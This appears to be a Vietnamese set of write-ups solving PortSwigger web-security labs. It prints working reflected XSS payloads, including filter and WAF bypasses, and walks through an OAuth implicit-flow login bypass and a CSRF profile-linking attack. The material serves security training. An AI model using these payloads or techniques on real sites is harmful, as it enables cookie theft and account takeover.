<li>Sử dụng custom tags và SVG</li>
<li>Escape từ JavaScript context</li>
<li>Trigger qua event handlers</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-into-html-context-with-nothing-encoded"><a class="header" href="#lab-reflected-xss-into-html-context-with-nothing-encoded">Lab: Reflected XSS into HTML context with nothing encoded</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">PortSwigger Lab</a></p>
<h2 id="mô-tả-14"><a class="header" href="#mô-tả-14">Mô tả</a></h2>
<p>Lab này là bài đầu tiên trong chủ đề Reflected XSS. Công việc của mình là khiến website la lên thông qua hàm <em>alert()</em>.</p>
<h2 id="khai-thác-21"><a class="header" href="#khai-thác-21">Khai thác</a></h2>
<p>Mở Lab thì mình sẽ thấy ngay một ô <em>Search</em> và ngại gì nữa mà không thử <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="xss/reflected-xss/html-context-nothing-encoded/interface.png" alt="Thử payload"></p>
<p>Ngay sau đó, website đã la lên “1” rồi nè =)))</p>
<p><img src="xss/reflected-xss/html-context-nothing-encoded/alerted.png" alt="Thử payload"></p>
<h2 id="kết-quả-13"><a class="header" href="#kết-quả-13">Kết quả</a></h2>
<p>Như vậy, ta có thể thấy khi chức năng Search không được chăm sóc kỹ thì sẽ dẫn đến XSS. Ở Lab này, tác giả đã không mã hóa nội dung khi mình gửi request lên server. Vậy là ta đã solved rồi :3</p>
<p><img src="xss/reflected-xss/html-context-nothing-encoded/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked"><a class="header" href="#lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">PortSwigger Lab</a></p>
<h2 id="mô-tả-15"><a class="header" href="#mô-tả-15">Mô tả</a></h2>
<p>Bài này yêu cầu ta thực hiện bypass qua WAF và gọi được hàm <em>print()</em>.</p>
<h2 id="phân-tích-15"><a class="header" href="#phân-tích-15">Phân tích</a></h2>
<p>Về tổng thể, bài này có giao diện tương tự như Lab trước. Như tên bài Lab, nó sẽ chặn các thẻ và thuộc tính nhất định khi ta truyền XSS script vào.</p>
<p><img src="xss/reflected-xss/html-context-tags-and-attributes-blocked/blocked-tag.png" alt="Thử tag"></p>
<p>Mình đã thử vài thẻ nhưng không bypass được. Do vậy, mình sẽ dùng Burp Intruder để bruteforce tìm ra whitelist:</p>
<p><img src="xss/reflected-xss/html-context-tags-and-attributes-blocked/accepted-tag.png" alt="Bruteforce"></p>
<p>Mọi người có thể thấy, <code>body</code> được whitelist trong lab này. Công đoạn tiếp theo là mình sẽ phải tìm attribute được whitelist. Vì nó sẽ bị block như vầy:</p>
<p><img src="xss/reflected-xss/html-context-tags-and-attributes-blocked/blocked-attribute.png" alt="Thử attribute"></p>
<p>Mình có biết sơ về XSS nên đã thử vài option như: <code>onerror</code>, <code>onload</code>,… nhưng không được, may sao <code>onresize</code> lại bypass được:</p>
<p><img src="xss/reflected-xss/html-context-tags-and-attributes-blocked/accepted-attribute.png" alt="Bypass attribute block"></p>
<h2 id="khai-thác-22"><a class="header" href="#khai-thác-22">Khai thác</a></h2>
<p>Giờ thì vào Exploit Server và gắn payload <code>&lt;body onresize=print()&gt;</code> vào để exploit thôi:</p>
<p><code>Payload: &lt;iframe src="https://ac771fb71ec56c4cc17a19d000c30039.web-security-academy.net/?search=&lt;body%20onresize=print()&gt;" onload=this.style.width='100px'&gt;</code></p>
<p>Note: Ban đầu mình không gắn <code>onload</code> vào iframe nên nó không load được cái src của mình nên cần phải gắn attribute vô iframe.</p>
<h2 id="kết-quả-14"><a class="header" href="#kết-quả-14">Kết quả</a></h2>
<p>Vậy là solved rồi:</p>
<p><img src="xss/reflected-xss/html-context-tags-and-attributes-blocked/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones"><a class="header" href="#lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones">Lab: Reflected XSS into HTML context with all tags blocked except custom ones</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked">PortSwigger Lab</a></p>
<h2 id="mô-tả-16"><a class="header" href="#mô-tả-16">Mô tả</a></h2>
<p>Bài Lab này cũng tương tự như phần chặn hầu hết các tags và attribute, tuy vậy nó sẽ cho ta sử dụng custom tags. Lab yêu cầu ta thực hiện alert ra <em>document.cookie</em>.</p>
<h2 id="phân-tích-16"><a class="header" href="#phân-tích-16">Phân tích</a></h2>
<p>Vì nó đã block hết tags nên ta không thể truyền script vào được:</p>
<p><img src="xss/reflected-xss/html-context-custom-tags-allowed/blocked-tag.png" alt="Block các tags"></p>
<h2 id="khai-thác-23"><a class="header" href="#khai-thác-23">Khai thác</a></h2>
<p>Thế thì ta chỉ cần custom cái tag lại và Delivery đến lab:</p>
<p><code>Payload: &lt;script&gt; location='https://ac431f2f1efc3d82c04819bd00a6002d.web-security-academy.net/?search=&lt;nh4ttruong+id=x+onfocus=alert(document.cookie)+tabindex=1&gt;#x'; &lt;/script&gt;</code></p>
<p>Dùng <code>onfocus</code> để trigger đến alert, dùng #x để trỏ ngay đến id của tag.</p>
<h2 id="kết-quả-15"><a class="header" href="#kết-quả-15">Kết quả</a></h2>
<p><img src="xss/reflected-xss/html-context-custom-tags-allowed/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-with-event-handlers-and-href-attributes-blocked"><a class="header" href="#lab-reflected-xss-with-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">PortSwigger Lab</a></p>
<h2 id="mô-tả-17"><a class="header" href="#mô-tả-17">Mô tả</a></h2>
<p>Bài Lab yêu cầu ta thực hiện Reflected XSS khi các event handlers và href attribute đã bị block. Bên cạnh đó, sử dụng vector để gọi alert.</p>
<h2 id="khai-thác-24"><a class="header" href="#khai-thác-24">Khai thác</a></h2>
<p>Do vậy, mình sẽ sử dụng <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animate"><em>svg</em></a> tag để trigger alert vì nó có thẻ con là <code>animate</code> và trong <code>animate</code> có thuộc tính <em>attributeName</em>, <em>values</em> và mình có thể thêm href cũng như script vào tùy ý.</p>
<p><code>Payload: https://ace01fe61f679bb0c0a0298b00bc0014.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%3C%2Ftext%3E%3C%2Fa%3E</code></p>
<h2 id="kết-quả-16"><a class="header" href="#kết-quả-16">Kết quả</a></h2>
<p><img src="xss/reflected-xss/event-handlers-and-href-attributes-blocked/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-with-some-svg-markup-allowed"><a class="header" href="#lab-reflected-xss-with-some-svg-markup-allowed">Lab: Reflected XSS with some SVG markup allowed</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed">PortSwigger Lab</a></p>
<h2 id="mô-tả-18"><a class="header" href="#mô-tả-18">Mô tả</a></h2>
<p>Lab này yêu cầu ta thực hiện gọi alert() và đương nhiên nó sẽ chặn một vài tags.</p>
<h2 id="phân-tích-17"><a class="header" href="#phân-tích-17">Phân tích</a></h2>
<p>Đến đây, mình thử dùng được tag <svg>. Mình thử qua các child tag của <svg> thì thấy <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animateTransform"><animatetransform></animatetransform></a> không bị block.</svg></svg></p>
<p>Vì lab này không chặn các event handlers, nên mình sẽ cố bắt nó chạy các event handlers. Chuyện có vẻ khá khó khi nó cũng chặn các event handlers. Giờ thì bruteforce thoi.</p>
<p>Sau khi bruteforce, mình thấy <code>onbegin</code> được thả, nên dùng nó vào.</p>
<h2 id="khai-thác-25"><a class="header" href="#khai-thác-25">Khai thác</a></h2>
<p><code>Payload: &lt;svg&gt;&lt;animateTransform attributeName=nh4ttruong onbegin=alert(1)&gt;&lt;/svg&gt;</code></p>
<p><img src="xss/reflected-xss/svg-markup/alert.png" alt="Solved"></p>
<h2 id="kết-quả-17"><a class="header" href="#kết-quả-17">Kết quả</a></h2>
<p>Thế là done:</p>
<p><img src="xss/reflected-xss/svg-markup/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded"><a class="header" href="#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Lab: Reflected XSS into attribute with angle brackets HTML-encoded</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded">PortSwigger Lab</a></p>
<h2 id="mô-tả-19"><a class="header" href="#mô-tả-19">Mô tả</a></h2>
<p>Lab yêu cầu ta khiến website la lên bằng “alert()”.</p>
<h2 id="phân-tích-18"><a class="header" href="#phân-tích-18">Phân tích</a></h2>
<p>Đầu tiên, ta test thử với <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>:</p>
<p><img src="xss/reflected-xss/angle-brackets-html-encoded/test.png" alt="Test script"></p>
<p>Ta có thể thấy, dấu ‘&lt;’ bị mã hóa thành ‘&lt;’ và dấu ‘&gt;’ bị mã hóa thành ‘&gt;’. Do vậy, script sẽ không thể chạy, giờ thì tìm cách khác.</p>
<p><img src="xss/reflected-xss/angle-brackets-html-encoded/vuln.png" alt="Vuln"></p>
<p>Theo như hình trên, mọi người có thể thấy, thẻ input có thuộc tích values chứa nội dung mà ta search và được ngăn nhau bởi ‘“’. Bây giờ, ý tưởng là sẽ thực hiện thêm event handler vào và trigger nó thôi.</p>
<h2 id="khai-thác-26"><a class="header" href="#khai-thác-26">Khai thác</a></h2>
<p><img src="xss/reflected-xss/angle-brackets-html-encoded/payload.png" alt="Payload"></p>
<p>Mình đã thêm <code>"onmousemove="alert(1)</code> vào để biến nó thành <code>...values=""onmousemove="alert(1)"</code> để trigger khi di chuyển chuột thì sẽ chạy alert(1).</p>
<h2 id="kết-quả-18"><a class="header" href="#kết-quả-18">Kết quả</a></h2>
<p>Và thế là solved!</p>
<p><img src="xss/reflected-xss/angle-brackets-html-encoded/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-in-canonical-link-tag"><a class="header" href="#lab-reflected-xss-in-canonical-link-tag">Lab: Reflected XSS in canonical link tag</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag">PortSwigger Lab</a></p>
<h2 id="mô-tả-20"><a class="header" href="#mô-tả-20">Mô tả</a></h2>
<p>Bài lab này yêu cầu ta thực hiện trigger với shortcut key để khiến website alert().</p>
<h2 id="khai-thác-27"><a class="header" href="#khai-thác-27">Khai thác</a></h2>
<p>Vậy thì chỉ có thể dùng <code>accesskey</code> để kêu nó alert thôi:</p>
<p><code>Payload: .?accesskey='x'onclick='alert(1)</code></p>
<p>Alert được gọi khi ta nhấn “ALT+SHIFT+X”:</p>
<p><img src="xss/reflected-xss/canonical-link-tag/trigger.png" alt="Trigger"></p>
<h2 id="kết-quả-19"><a class="header" href="#kết-quả-19">Kết quả</a></h2>
<p>Và solved:</p>
<p><img src="xss/reflected-xss/canonical-link-tag/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped"><a class="header" href="#lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped">PortSwigger Lab</a></p>
<h2 id="mô-tả-21"><a class="header" href="#mô-tả-21">Mô tả</a></h2>
<p>Lab này yêu cầu ta dùng trick để bypass bằng dấu “’” và “/”, “" của website.</p>
<h2 id="phân-tích-19"><a class="header" href="#phân-tích-19">Phân tích</a></h2>
<p>Test thử thanh search của Lab và check source code:</p>
<p><img src="xss/reflected-xss/js-single-quote/source.png" alt="Source code"></p>
<p>Ta thấy, script của website sẽ như sau:</p>
<pre><code class="language-javascript">&lt;script&gt;
    var searchTerms = '123';
    document.write('&lt;img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'"&gt;');
&lt;/script&gt;
</code></pre>
<p><code>encodeURIComponent()</code> trong Javascript sẽ mã hóa tất cả các ký tự ngoại trừ <code>- _ . ! ~ * ' ( )</code>. Do vậy, mình đã thử nhiều cái những vẫn bị encode đưa vào <code>document.write</code>.</p>
<p>Nhưng mà, ta có thể chèn <code>&lt;/script&gt;</code> vô để khóa cái <code>searchTerms</code> lại và chèn thêm script tùy ý vào mà đúng không =))))</p>
<h2 id="khai-thác-28"><a class="header" href="#khai-thác-28">Khai thác</a></h2>
<p>Payload: <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h2 id="kết-quả-20"><a class="header" href="#kết-quả-20">Kết quả</a></h2>
<p><img src="xss/reflected-xss/js-single-quote/solved.png" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="stored-xss-1"><a class="header" href="#stored-xss-1">Stored XSS</a></h1>
<h2 id="-under-construction-"><a class="header" href="#-under-construction-">🚧 Under Construction 🚧</a></h2>
<p><strong>Status:</strong> Đang trong quá trình “nghiên cứu sâu” (aka đang procrastinate) 😅</p>
<p>Xin lỗi bạn đọc! Phần này tác giả đang:</p>
<ul>
<li><del>Làm LAB</del> ❌</li>
<li><del>Viết write-up</del> ❌</li>
<li>Ngồi suy nghĩ về cuộc đời ✅</li>
<li>Đợi deadline áp lại gần để có động lực ✅</li>
</ul>
<h2 id="tại-sao-chưa-có-nội-dung"><a class="header" href="#tại-sao-chưa-có-nội-dung">Tại sao chưa có nội dung?</a></h2>
<p>Stored XSS thì… nó được “stored” rồi, để từ từ lấy ra viết sau nhé! 🤣</p>
<h2 id="hẹn-gặp-lại"><a class="header" href="#hẹn-gặp-lại">Hẹn gặp lại!</a></h2>
<p><strong>Coming soon™</strong> (năm 2077 chắc có rồi 😂)</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="oauth-20-authentication-vulnerabilities"><a class="header" href="#oauth-20-authentication-vulnerabilities">OAuth 2.0 Authentication Vulnerabilities</a></h1>
<h2 id="oauth-là-gì"><a class="header" href="#oauth-là-gì">OAuth là gì?</a></h2>
<p>Có bao giờ bạn thắc mắc tại sao các website cho phép <strong>Sign in with Google</strong>, <strong>Sign in with GitHub</strong>?</p>
<p><img src="oauth/oauth-example.jpg" alt="Ví dụ về OAuth"></p>
<p>Đó chính là OAuth/OAuth 2.0 - một protocol cho phép website sử dụng chức năng xác thực của một service khác (như Google, Facebook, GitHub) mà không cần user chia sẻ password.</p>
<h2 id="cách-oauth-20-hoạt-động"><a class="header" href="#cách-oauth-20-hoạt-động">Cách OAuth 2.0 hoạt động</a></h2>
<p>OAuth 2.0 là trung gian giao tiếp giữa 3 bên:</p>
<ul>
<li><strong>Resource Owner</strong> (User): Chủ sở hữu data</li>
<li><strong>Client Application</strong>: Website muốn truy cập data</li>
<li><strong>OAuth Provider</strong>: Service cung cấp OAuth (Google, Facebook, etc.)</li>
</ul>
<h3 id="quy-trình-cơ-bản-4-bước"><a class="header" href="#quy-trình-cơ-bản-4-bước">Quy trình cơ bản (4 bước)</a></h3>
<ol>
<li><strong>Client Application</strong> yêu cầu quyền truy cập một phần data của user</li>
<li><strong>User</strong> đăng nhập vào OAuth Provider và đồng ý cấp quyền</li>
<li><strong>Client Application</strong> nhận <strong>access token</strong> từ OAuth Provider</li>
<li><strong>Client Application</strong> dùng token để gọi API và lấy data của user</li>
</ol>
<h3 id="oauth-grant-types"><a class="header" href="#oauth-grant-types">OAuth Grant Types</a></h3>
<ul>
<li><strong>Authorization Code</strong>: Secure nhất, dành cho server-side apps</li>
<li><strong>Implicit</strong>: Đơn giản hơn nhưng kém an toàn, dành cho client-side apps</li>
<li><strong>Client Credentials</strong>: Dành cho machine-to-machine</li>
<li><strong>Resource Owner Password</strong>: Ít được khuyến khích dùng</li>
</ul>
<h2 id="các-lỗ-hổng-phổ-biến"><a class="header" href="#các-lỗ-hổng-phổ-biến">Các lỗ hổng phổ biến</a></h2>
<h3 id="phía-client-application"><a class="header" href="#phía-client-application">Phía Client Application</a></h3>
<ul>
<li>❌ Không validate <code>state</code> parameter → CSRF</li>
<li>❌ Tin tưởng hoàn toàn data từ OAuth Provider</li>
<li>❌ Implement sai grant type flow</li>
</ul>
<h3 id="phía-oauth-provider"><a class="header" href="#phía-oauth-provider">Phía OAuth Provider</a></h3>
<ul>
<li>❌ Không validate <code>redirect_uri</code> đúng cách</li>
<li>❌ Không kiểm tra <code>client_id</code></li>
<li>❌ Lỗ hổng trong scope validation</li>
<li>❌ Token leakage qua Referer header</li>
</ul>
<h3 id="phía-user"><a class="header" href="#phía-user">Phía User</a></h3>
<ul>
<li>❌ Phishing - đăng nhập vào fake OAuth Provider</li>
<li>❌ Malicious apps yêu cầu quá nhiều permissions</li>
</ul>
<h2 id="labs---danh-sách-các-bài-thực-hành-3"><a class="header" href="#labs---danh-sách-các-bài-thực-hành-3">Labs - Danh sách các bài thực hành</a></h2>
<h3 id="1-implicit-flow-vulnerabilities"><a class="header" href="#1-implicit-flow-vulnerabilities">1. Implicit Flow Vulnerabilities</a></h3>
<p><a href="oauth/implicit-flow/README.html">Các lab về lỗ hổng trong Implicit Flow</a></p>
<ul>
<li><a href="#lab-authentication-bypass-via-oauth-implicit-flow">Lab: Authentication bypass via OAuth implicit flow</a></li>
<li><a href="#lab-forced-oauth-profile-linking">Lab: Forced OAuth profile linking</a></li>
</ul>
<h3 id="2-redirect-uri-vulnerabilities"><a class="header" href="#2-redirect-uri-vulnerabilities">2. Redirect URI Vulnerabilities</a></h3>
<p><a href="oauth/redirect-uri/README.html">Các lab về lỗ hổng Redirect URI</a></p>
<ul>
<li><a href="#lab-oauth-account-hijacking-via-redirect_uri">Lab: OAuth account hijacking via redirect_uri</a></li>
<li><a href="#lab-stealing-oauth-access-tokens-via-an-open-redirect">Lab: Stealing OAuth access tokens via an open redirect</a></li>
<li><a href="#lab-stealing-oauth-access-tokens-via-a-proxy-page">Lab: Stealing OAuth access tokens via a proxy page</a></li>
</ul>
<h2 id="cách-phòng-chống-1"><a class="header" href="#cách-phòng-chống-1">Cách phòng chống</a></h2>
<h3 id="oauth-provider-authorization-server"><a class="header" href="#oauth-provider-authorization-server">OAuth Provider (Authorization Server)</a></h3>
<p>✅ <strong>Validate redirect_uri nghiêm ngặt</strong></p>
<ul>
<li>Exact match hoặc whitelist cụ thể</li>
<li>Không cho phép wildcards trong domain</li>
<li>Kiểm tra cả protocol (https://)</li>
</ul>
<p>✅ <strong>Implement state parameter</strong></p>
<ul>
<li>Generate random, unique value mỗi request</li>
<li>Validate khi nhận callback</li>
</ul>
<p>✅ <strong>Token security</strong></p>
<ul>
<li>Short-lived access tokens</li>
<li>Refresh tokens với rotation</li>
<li>Bind tokens to client</li>
</ul>
<h3 id="client-application"><a class="header" href="#client-application">Client Application</a></h3>
<p>✅ <strong>Luôn dùng state parameter</strong> để chống CSRF</p>
<p>✅ <strong>Validate tokens</strong></p>
<ul>
<li>Verify signature nếu dùng JWT</li>
<li>Check expiration time</li>
<li>Validate issuer và audience</li>
</ul>
<p>✅ <strong>Redirect URI best practices</strong></p>
<ul>
<li>Register exact URIs với provider</li>
<li>Không dùng wildcard redirects</li>
<li>Validate redirect_uri ở backend</li>
</ul>
<p>✅ <strong>Scope principle</strong></p>
<ul>
<li>Chỉ request scopes cần thiết</li>
<li>Hiển thị rõ permissions cho user</li>
</ul>
<h3 id="user"><a class="header" href="#user">User</a></h3>
<p>✅ Check URL trước khi login (phishing)
✅ Review app permissions định kỳ
✅ Revoke access của apps không dùng</p>
<h2 id="impact-của-oauth-vulnerabilities"><a class="header" href="#impact-của-oauth-vulnerabilities">Impact của OAuth vulnerabilities</a></h2>
<ul>
<li>🔴 <strong>Account takeover</strong>: Chiếm tài khoản victim</li>
<li>🔴 <strong>Data leakage</strong>: Đọc private data của user</li>
<li>🟠 <strong>Unauthorized actions</strong>: Thực hiện actions thay mặt user</li>
<li>🟡 <strong>Privacy violation</strong>: Thu thập data không đồng ý</li>
</ul>
<h2 id="tài-nguyên-tham-khảo-3"><a class="header" href="#tài-nguyên-tham-khảo-3">Tài nguyên tham khảo</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/oauth">PortSwigger OAuth Authentication</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">OAuth 2.0 Security Best Practices</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc6749">OAuth 2.0 RFC 6749</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="oauth-implicit-flow"><a class="header" href="#oauth-implicit-flow">OAuth Implicit Flow</a></h1>
<blockquote>
<p><strong>OAuth 2.0 Implicit Grant Type và Profile Linking</strong></p>
<p>Các labs trong phần này tập trung vào lỗ hổng liên quan đến Implicit Flow và việc link profile trong OAuth 2.0.</p>
</blockquote>
<h2 id="giới-thiệu-9"><a class="header" href="#giới-thiệu-9">Giới thiệu</a></h2>
<p>Implicit Grant Type là một trong những flow của OAuth 2.0, được thiết kế để đơn giản và nhanh chóng. Tuy nhiên, chính sự đơn giản này cũng tạo ra các lỗ hổng bảo mật nếu không được triển khai cẩn thận.</p>
<h2 id="labs-6"><a class="header" href="#labs-6">Labs</a></h2>
<h3 id="authentication-bypass-via-oauth-implicit-flow"><a class="header" href="#authentication-bypass-via-oauth-implicit-flow"><a href="#lab-authentication-bypass-via-oauth-implicit-flow">Authentication bypass via OAuth implicit flow</a></a></h3>
<p>Khai thác lỗ hổng trong implicit grant type để bypass authentication và truy cập tài khoản khác.</p>
<h3 id="forced-oauth-profile-linking"><a class="header" href="#forced-oauth-profile-linking"><a href="#lab-forced-oauth-profile-linking">Forced OAuth profile linking</a></a></h3>
<p>Lợi dụng lỗ hổng CSRF trong quá trình link profile OAuth để chiếm quyền tài khoản admin.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-authentication-bypass-via-oauth-implicit-flow"><a class="header" href="#lab-authentication-bypass-via-oauth-implicit-flow">Lab: Authentication bypass via OAuth implicit flow</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow">https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow</a></p>
<p><img src="oauth/implicit-flow/oauth-implicit-flow/lab.jpg" alt="Lab implicit-flow"></p>
<h2 id="oauth-implicit-grant-type"><a class="header" href="#oauth-implicit-grant-type">OAuth Implicit Grant Type</a></h2>
<p>Đối với <em>Implicit grant type</em>, đây là một cách xác thực kiểu ngầm hiểu và nhanh chóng. Chính vì nó nhanh nên dễ có lỗi. Tổng quan qua thì flow của nó như sau:</p>
<ol>
<li><strong>Authorization request</strong> - Xác thực yêu cầu: Khi người dùng yêu cầu login bằng OAuth, website sẽ request đến OAuth Service</li>
<li><strong>User consent</strong> - Người dùng chấp thuận: Người dùng sẽ click để đồng ý với request login bằng OAuth</li>
<li><strong>Access token grant</strong> - Cấp mã token để truy cập: Sau khi user đồng ý request, OAuth Service sẽ chuyển hướng đến trình duyệt của user. Nhưng thay vì nó gửi theo một mã xác thực thì “implicit grant type” nó gửi luôn cái token thông qua request. Sau đó, Client Application phải lấy thông tin đó và cấp truy cập</li>
<li><strong>API call</strong> - Gọi API: Sau khi có được access token, Client Application gọi một API đến OAuth Service thông qua trình duyệt để request thông tin người dùng <em>/userinfo</em></li>
<li><strong>Resource grant</strong> - Cấp quyền truy cập tài nguyên: Server sẽ xác thực token đối với Client Application đang ở phiên đó. Nếu đúng thì nó sẽ phản hồi bằng cách request tài nguyên dữ liệu của user dựa trên token và Client Application có thể sử dụng thông tin, data đó của user.</li>
</ol>
<h2 id="mục-tiêu-1"><a class="header" href="#mục-tiêu-1">Mục tiêu</a></h2>
<p>Bài lab này yêu cầu ta thực hiện login với tài khoản social media và cố gắng truy cập vào bằng tài khoản email <em>carlos@carlos-montoya.net</em></p>
<h2 id="giải-pháp-1"><a class="header" href="#giải-pháp-1">Giải pháp</a></h2>
<p>Lab đã cung cấp sẵn tài khoản của chú Wiener rồi và chúng ta sẽ truy cập thử vào tài khoản này rồi sử dụng Burp Suite để kiểm tra HTTP Proxy xem điều gì xảy ra nhé!</p>
<p><img src="oauth/implicit-flow/oauth-implicit-flow/loginasdefault.jpg" alt="Login bằng tài khoản của chú Wiener"></p>
<p>Sau khi login vào tài khoản của chú Wiener, mình kiểm tra HTTP Proxy thì nó ghi lại log như sau:</p>
<p><img src="oauth/implicit-flow/oauth-implicit-flow/httpproxy.jpg" alt="HTTP proxy"></p>
<p>Ở request thứ 58, xuất hiện request đến OAuth Service <em>/auth/…</em> để xác thực thông tin user đến (host của nó là oauth-acb….)</p>
<p>Check xuống thì ta có thể thấy ở request 68, server đang thực hiện phản hồi bằng cách POST <em>/authenticate</em> đến host Client Service để thông báo là “à token đó đúng rồi đó, bạn có thể truy cập tài nguyên của user rồi đó”</p>
<p><img src="oauth/implicit-flow/oauth-implicit-flow/gettoken.jpg" alt="Token của phiên"></p>
<p>Okay, đến đây thì mình đã có access token, một cái mã để truy cập cho phiên làm việc. Vậy thì mình sẽ dựa vào cái này để đánh lừa server là ông chú Carlos đang truy cập với email của ổng. Vì với “implicit grant type” không có bước nào nó xác thực lại thông tin request của bên OAuth cả mà nó theo 1 flow qua lại sau khi user đã đồng ý login bằng OAuth.</p>
<p>Ta thực hiện đổi “email” của chú Wiener thành của chú Carlos và POST request lên server:</p>
<p><img src="oauth/implicit-flow/oauth-implicit-flow/loginascarlos.jpg" alt="Gửi request"></p>
<p>Cuối cùng, ta thực hiện reload lại trình duyệt và kiểm tra thì đã solved được lab cũng như truy cập thành công tài khoản của chú Carlos yêu dấu.</p>
<p><img src="oauth/implicit-flow/oauth-implicit-flow/solved.jpg" alt="Solved"></p>
<p><strong>Note:</strong> Nếu reload mà không thấy được solve thì bạn có thể sử dụng chức năng <a href="oauth/implicit-flow/oauth-implicit-flow/note.jpg"><em>Request to browser</em></a> để chọn phiên làm việc của cái request POST đã sửa email nhé!</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-forced-oauth-profile-linking"><a class="header" href="#lab-forced-oauth-profile-linking">Lab: Forced OAuth profile linking</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking">https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking</a></p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/lab.jpg" alt="Lab implicit-flow"></p>
<h2 id="giới-thiệu-10"><a class="header" href="#giới-thiệu-10">Giới thiệu</a></h2>
<p>Trong bài này, mình sẽ cần login vào tài khoản bằng OAuth thay vì là tài khoản và mật khẩu thông thường. Lab cũng nói là sử dụng CSRF để khai thác.</p>
<h2 id="phân-tích-20"><a class="header" href="#phân-tích-20">Phân tích</a></h2>
<p>Tương tự như các bài lab, ta thử login bằng tài khoản được cung cấp, sau đó link với OAuth</p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/login.jpg" alt="Login bằng tài khoản được cung cấp"></p>
<p>Sau đó, sử dụng tài khoản <em>peter.wiener:hotdog</em> để link với social account</p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/attach.jpg" alt="Link với OAuth"></p>
<p>Đến đây, ta sẽ phân tích Proxy History xem những gì đã xảy ra. Mình phát hiện được request thứ 53 là một request để link tài khoản social với tài khoản dạng <em>/auth…</em></p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/auth-history.jpg" alt="Request xác thực"></p>
<p>Như lab đã đề cập, bài này sẽ liên quan đến CSRF, do vậy, khi xem kỹ request này thì tham số <em>state</em> không được sử dụng.</p>
<p>Tham số <em>state</em> là một tham số có nhiệm vụ mã hóa thông tin mà bạn cần. Sau đó, bạn sẽ sử dụng một giá trị random đó để xác thực lúc nhận được phản hồi. Tham số này rất quan trọng để tránh CSRF attack nhưng trong request trên thì người ta lại không dùng. Đến đây thì mình sẽ lợi dụng tính thiếu xác thực này để khai thác nó.</p>
<h2 id="khai-thác-29"><a class="header" href="#khai-thác-29">Khai thác</a></h2>
<p>Trong proxy history, ở request thứ 66, ta có thể thấy được 1 request dạng <em>/oauth-linking=?code…</em>. Request này có vẻ như yêu cầu xác thực với code để hoàn tất quá trình login bằng OAuth. Và với vai trò như vậy thì có nghĩa code này sẽ chỉ được sử dụng 1 lần. Dựa vào đây mình có thể nhờ nó để có thể đánh lừa server bằng cách trộm nó nhưng không sử dụng nó, có nghĩa là nó vẫn còn hiệu lực và mình có thể khai thác bằng cách đánh lừa <em>exploit server</em> mà lab đã cung cấp để login as admin.</p>
